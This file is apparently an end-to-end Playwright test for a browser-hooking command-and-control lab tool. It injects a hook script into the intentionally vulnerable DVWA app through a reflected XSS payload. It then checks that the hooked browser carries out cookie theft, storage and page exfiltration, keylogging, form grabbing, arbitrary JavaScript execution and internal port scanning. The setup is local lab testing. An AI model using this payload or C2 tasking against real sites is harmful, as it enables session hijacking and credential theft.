/**
 * Ghost Lab — End-to-End Module Verification
 *
 * Uses Playwright (real Chromium) to:
 * 1. Login to DVWA
 * 2. Inject hook.js via reflected XSS
 * 3. Wait for agent registration on C2
 * 4. Send each task type and verify results are real
 *
 * Environment variables:
 *   C2_URL   — Ghost C2 base URL  (default: http://localhost:5000)
 *   DVWA_URL — DVWA base URL      (default: http://localhost:8080)
 *
 * Inside Docker Compose these point to container service names.
 * Running locally they default to localhost.
 */

const { chromium } = require("playwright");

const C2 = process.env.C2_URL || "http://localhost:5000";
const DVWA = process.env.DVWA_URL || "http://localhost:8080";

const PASS = "\x1b[32mPASS\x1b[0m";
const FAIL = "\x1b[31mFAIL\x1b[0m";
const INFO = "\x1b[36mINFO\x1b[0m";

let totalPass = 0;
let totalFail = 0;

function assert(label, condition, detail) {
  if (condition) {
    console.log(`  ${PASS}  ${label}${detail ? " — " + detail : ""}`);
    totalPass++;
  } else {
    console.log(`  ${FAIL}  ${label}${detail ? " — " + detail : ""}`);
    totalFail++;
  }
}

async function c2Get(path) {
  const res = await fetch(`${C2}${path}`);
  return res.json();
}

async function c2Post(path, body) {
  const res = await fetch(`${C2}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return res.json();
}

async function waitForAgent(timeoutMs = 15000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const agents = await c2Get("/panel/agents");
    if (agents.length > 0) {
      return agents[agents.length - 1];
    }
    await new Promise((r) => setTimeout(r, 500));
  }
  return null;
}

async function waitForResult(agentId, taskType, timeoutMs = 20000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const results = await c2Get(`/panel/agent/${agentId}/results`);
    const match = results.find((r) => r.task_type === taskType);
    if (match) return match;
    await new Promise((r) => setTimeout(r, 500));
  }
  return null;
}

async function waitForResultAfter(agentId, taskType, afterTs, timeoutMs = 25000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const results = await c2Get(`/panel/agent/${agentId}/results`);
    const match = results.find(
      (r) => r.task_type === taskType && new Date(r.ts) > new Date(afterTs)
    );
    if (match) return match;
    await new Promise((r) => setTimeout(r, 500));
  }
  return null;
}

async function main() {
  console.log("\n\x1b[36m══════════════════════════════════════════\x1b[0m");
  console.log("\x1b[36m  GHOST LAB — E2E Module Verification\x1b[0m");
  console.log("\x1b[36m══════════════════════════════════════════\x1b[0m\n");
  console.log(`${INFO}  C2:   ${C2}`);
  console.log(`${INFO}  DVWA: ${DVWA}\n`);

  // ─── Launch browser ────────────────────────────
  console.log(`${INFO}  Launching Chromium...`);
  const browser = await chromium.launch({
    headless: true,
    args: ["--no-sandbox", "--disable-setuid-sandbox"],
  });
  const context = await browser.newContext({
    ignoreHTTPSErrors: true,
    permissions: [],
  });
  const page = await context.newPage();

  // ─── Setup DVWA ────────────────────────────────
  console.log(`${INFO}  Setting up DVWA...\n`);

  // Login
  await page.goto(`${DVWA}/login.php`, { waitUntil: "networkidle" });
  await page.fill('input[name="username"]', "admin");
  await page.fill('input[name="password"]', "password");
  await page.click('input[name="Login"]');
  await page.waitForURL("**/index.php*", { timeout: 10000 }).catch(async () => {
    if (page.url().includes("setup")) {
      await page.click('input[name="create_db"]');
      await page.waitForTimeout(2000);
      await page.goto(`${DVWA}/login.php`, { waitUntil: "networkidle" });
      await page.fill('input[name="username"]', "admin");
      await page.fill('input[name="password"]', "password");
      await page.click('input[name="Login"]');
      await page.waitForTimeout(2000);
    }
  });

  // Set security to low
  await context.addCookies([
    { name: "security", value: "low", url: DVWA },
  ]);

  // ─── Inject hook via XSS ──────────────────────
  console.log(`[TEST] Hook injection via XSS\n`);
  const xssUrl = `${DVWA}/vulnerabilities/xss_r/?name=<script src="${C2}/hook.js"></script>`;
  await page.goto(xssUrl, { waitUntil: "networkidle" });
  await page.waitForTimeout(3000);

  const agent = await waitForAgent();
  assert("Agent registered on C2", agent !== null, agent ? `id=${agent.id}` : "no agent found");
  if (!agent) {
    console.log("\n  Cannot continue without agent. Aborting.");
    await browser.close();
    process.exit(1);
  }

  const agentId = agent.id;

  const detail = await c2Get(`/panel/agent/${agentId}`);
  assert(
    "Fingerprint captured",
    detail.info && detail.info.user_agent && detail.info.user_agent.length > 10,
    `ua=${(detail.info.user_agent || "").slice(0, 50)}`
  );

  // ─── Test 1: steal_cookies ────────────────────
  console.log(`\n[TEST] steal_cookies\n`);
  let ts = new Date().toISOString();
  await c2Post("/panel/task", { agent_id: agentId, type: "steal_cookies" });
  await page.waitForTimeout(4000);
  let result = await waitForResultAfter(agentId, "steal_cookies", ts);
  assert(
    "steal_cookies returned data",
    result && result.data && typeof result.data.cookies === "string",
    result ? `cookies="${(result.data.cookies || "").slice(0, 60)}"` : "no result"
  );
  assert(
    "Contains PHPSESSID",
    result && result.data && result.data.cookies && result.data.cookies.includes("PHPSESSID"),
    ""
  );

  // ─── Test 2: exfil_localstorage ───────────────
  console.log(`\n[TEST] exfil_localstorage\n`);

  await page.evaluate(() => {
    localStorage.setItem("ghost_test_key", "ghost_test_value_12345");
    sessionStorage.setItem("ghost_session_key", "session_val_99");
  });

  ts = new Date().toISOString();
  await c2Post("/panel/task", { agent_id: agentId, type: "exfil_localstorage" });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(agentId, "exfil_localstorage", ts);
  assert(
    "exfil_localstorage returned data",
    result && result.data && result.data.local_storage,
    ""
  );
  assert(
    "localStorage contains test key",
    result &&
      result.data &&
      result.data.local_storage &&
      result.data.local_storage.ghost_test_key === "ghost_test_value_12345",
    result && result.data && result.data.local_storage
      ? `ghost_test_key="${result.data.local_storage.ghost_test_key}"`
      : "missing"
  );
  assert(
    "sessionStorage captured",
    result &&
      result.data &&
      result.data.session_storage &&
      result.data.session_storage.ghost_session_key === "session_val_99",
    result && result.data && result.data.session_storage
      ? `ghost_session_key="${result.data.session_storage.ghost_session_key}"`
      : "missing"
  );

  // ─── Test 3: exec_js ─────────────────────────
  console.log(`\n[TEST] exec_js\n`);

  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: agentId,
    type: "exec_js",
    payload: { code: "2 + 2" },
  });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(agentId, "exec_js", ts);
  assert(
    "exec_js expression (2+2)",
    result && result.data && result.data.output === "4",
    result ? `output="${result.data.output}"` : "no result"
  );

  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: agentId,
    type: "exec_js",
    payload: { code: "var x = [1,2,3]; return x.length" },
  });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(agentId, "exec_js", ts);
  assert(
    "exec_js statement (return x.length)",
    result && result.data && result.data.output === "3",
    result ? `output="${result.data.output}"` : "no result"
  );

  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: agentId,
    type: "exec_js",
    payload: { code: "document.title" },
  });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(agentId, "exec_js", ts);
  assert(
    "exec_js DOM access (document.title)",
    result && result.data && result.data.output && result.data.output.includes("DVWA"),
    result ? `output="${(result.data.output || "").slice(0, 60)}"` : "no result"
  );

  // ─── Test 4: screenshot (DOM snapshot) ────────
  console.log(`\n[TEST] screenshot (DOM snapshot)\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", { agent_id: agentId, type: "screenshot" });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(agentId, "screenshot", ts);
  assert(
    "screenshot returned data",
    result && result.data && result.data.title,
    result ? `title="${(result.data.title || "").slice(0, 50)}"` : "no result"
  );
  assert(
    "screenshot has forms",
    result && result.data && Array.isArray(result.data.forms) && result.data.forms.length > 0,
    result ? `forms_count=${(result.data.forms || []).length}` : ""
  );
  assert(
    "screenshot has links",
    result && result.data && Array.isArray(result.data.links) && result.data.links.length > 0,
    result ? `links_count=${(result.data.links || []).length}` : ""
  );

  // ─── Test 5: exfil_page ──────────────────────
  console.log(`\n[TEST] exfil_page\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", { agent_id: agentId, type: "exfil_page" });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(agentId, "exfil_page", ts);
  assert(
    "exfil_page returned HTML",
    result && result.data && result.data.html && result.data.html.length > 500,
    result ? `html_length=${(result.data.html || "").length}` : "no result"
  );
  assert(
    "HTML contains DVWA content",
    result && result.data && result.data.html && result.data.html.includes("Damn Vulnerable"),
    ""
  );

  // ─── Test 6: inject_html ─────────────────────
  console.log(`\n[TEST] inject_html\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: agentId,
    type: "inject_html",
    payload: {
      html: '<div id="ghost-test-inject" style="display:none">GHOST_WAS_HERE</div>',
    },
  });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(agentId, "inject_html", ts);
  assert(
    "inject_html returned success",
    result && result.data && result.data.injected === true,
    ""
  );

  const injectedText = await page.evaluate(() => {
    const el = document.getElementById("ghost-test-inject");
    return el ? el.textContent : null;
  });
  assert(
    "Injected element exists in DOM",
    injectedText === "GHOST_WAS_HERE",
    `textContent="${injectedText}"`
  );

  // ─── Test 7: keylog ──────────────────────────
  console.log(`\n[TEST] keylog\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: agentId,
    type: "keylog",
    payload: { duration: 5000 },
  });

  await page.waitForTimeout(2000);

  const inputExists = await page.$('input[name="name"]');
  if (inputExists) {
    await page.click('input[name="name"]');
    await page.keyboard.type("ghost123", { delay: 100 });
  } else {
    await page.keyboard.type("ghost123", { delay: 100 });
  }

  await page.waitForTimeout(6000);
  result = await waitForResultAfter(agentId, "keylog", ts, 15000);
  assert(
    "keylog returned data",
    result && result.data,
    ""
  );
  assert(
    "keylog captured keystrokes",
    result && result.data && result.data.count > 0,
    result ? `count=${result.data.count}` : "no keystrokes"
  );
  if (result && result.data && result.data.keystrokes) {
    const keys = result.data.keystrokes.map((k) => k.key).join("");
    assert(
      "keylog captured correct keys",
      keys.includes("ghost123") || keys.includes("g") && keys.includes("h"),
      `keys="${keys}"`
    );
  }

  // ─── Test 8: form_grab ───────────────────────
  console.log(`\n[TEST] form_grab\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: agentId,
    type: "form_grab",
    payload: { duration: 10000 },
  });

  // Wait for implant to poll and receive form_grab task (3s poll interval + margin)
  await page.waitForTimeout(6000);

  const formInput = await page.$('input[name="name"]');
  if (formInput) {
    await page.fill('input[name="name"]', "captured_creds_test");
    const submitBtn = await page.$('input[type="submit"]');
    if (submitBtn) {
      await submitBtn.click();
    } else {
      await page.keyboard.press("Enter");
    }
  }

  // Wait for sendBeacon to fire and C2 to process it
  await page.waitForTimeout(3000);

  const allResults = await c2Get("/panel/results");
  const beaconResult = allResults.find(
    (r) =>
      r.task_type === "form_grab" &&
      r.data &&
      r.data.form &&
      new Date(r.ts) > new Date(ts)
  );
  assert(
    "form_grab beacon sent on submit",
    beaconResult !== null && beaconResult !== undefined,
    beaconResult ? `action="${(beaconResult.data.form.action || "").slice(0, 50)}"` : "no beacon found"
  );
  assert(
    "form_grab captured field values",
    beaconResult &&
      beaconResult.data.form &&
      beaconResult.data.form.fields &&
      beaconResult.data.form.fields.name === "captured_creds_test",
    beaconResult && beaconResult.data.form
      ? `name="${beaconResult.data.form.fields.name}"`
      : "missing"
  );

  // After form submit, page navigated. Re-inject hook.
  await page.goto(xssUrl, { waitUntil: "networkidle" });
  await page.waitForTimeout(4000);

  const agents = await c2Get("/panel/agents");
  const newAgent = agents[agents.length - 1];
  const activeAgentId = newAgent.id;
  console.log(`\n  ${INFO}  Active agent after re-hook: ${activeAgentId}\n`);

  // ─── Test 9: portscan ────────────────────────
  console.log(`[TEST] portscan\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: activeAgentId,
    type: "portscan",
    payload: { target: "localhost", ports: [5000, 8080, 3000, 3333, 9999], timeout: 3000 },
  });
  await page.waitForTimeout(5000);
  result = await waitForResultAfter(activeAgentId, "portscan", ts, 25000);
  assert(
    "portscan returned data",
    result && result.data && Array.isArray(result.data.scan_results),
    ""
  );
  if (result && result.data && result.data.scan_results) {
    const openPorts = result.data.scan_results
      .filter((r) => r.status === "open")
      .map((r) => r.port);
    assert(
      "portscan detected open ports",
      openPorts.length > 0,
      `open=${JSON.stringify(openPorts)}`
    );
    assert(
      "portscan found C2 port 5000",
      openPorts.includes(5000),
      `open_ports=${JSON.stringify(openPorts)}`
    );
    assert(
      "portscan found DVWA port 8080",
      openPorts.includes(8080),
      ""
    );
    assert(
      "portscan found Juice Shop port 3000",
      openPorts.includes(3000),
      ""
    );
    assert(
      "portscan found BeEF port 3333",
      openPorts.includes(3333),
      ""
    );
    // Note: localhost false positives are expected — browser port scanning
    // can't distinguish a closed port from an open non-HTTP port on localhost
    // because both return TCP RST fast. This is a known browser limitation.
  }

  // ─── Test 10: network_discovery ──────────────
  console.log(`\n[TEST] network_discovery\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", {
    agent_id: activeAgentId,
    type: "network_discovery",
    payload: { base: "127.0.0", start: 1, end: 1, timeout: 3000 },
  });
  await page.waitForTimeout(5000);
  result = await waitForResultAfter(activeAgentId, "network_discovery", ts, 15000);
  assert(
    "network_discovery returned data",
    result && result.data && Array.isArray(result.data.alive_hosts),
    result ? `found=${result.data.count} hosts` : "no result"
  );

  // ─── Test 11: clipboard ──────────────────────
  console.log(`\n[TEST] clipboard\n`);
  ts = new Date().toISOString();
  await c2Post("/panel/task", { agent_id: activeAgentId, type: "clipboard" });
  await page.waitForTimeout(4000);
  result = await waitForResultAfter(activeAgentId, "clipboard", ts);
  assert(
    "clipboard returned response",
    result && result.data,
    result && result.data
      ? result.data.clipboard
        ? `clipboard="${(result.data.clipboard || "").slice(0, 30)}"`
        : `error="${(result.data.error || "").slice(0, 60)}"`
      : "no result"
  );
  if (result && result.data && result.data.error) {
    console.log(`  ${INFO}  Expected: clipboard denied in headless — this is correct behavior`);
  }

  // ─── Summary ─────────────────────────────────
  console.log(`\n\x1b[36m══════════════════════════════════════════\x1b[0m`);
  console.log(
    `  Results: ${PASS} ${totalPass} passed  ${FAIL} ${totalFail} failed`
  );
  console.log(`\x1b[36m══════════════════════════════════════════\x1b[0m\n`);

  await browser.close();
  process.exit(totalFail > 0 ? 1 : 0);
}

main().catch((e) => {
  console.error("Test runner error:", e);
  process.exit(1);
});
